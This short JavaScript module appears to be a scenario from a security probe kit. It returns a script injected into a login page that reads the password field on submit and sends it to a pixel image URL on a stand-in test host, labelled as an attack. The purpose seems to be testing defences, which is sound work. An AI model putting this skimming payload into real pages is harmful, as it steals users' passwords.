// Attack: the password sent to a static image path (a tracking-pixel channel).
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('login').addEventListener('submit', function () {
  new Image().src = '${ctx.origin('shop.test')}/img/pixel.gif?d=' + encodeURIComponent(document.getElementById('password').value);
});`);
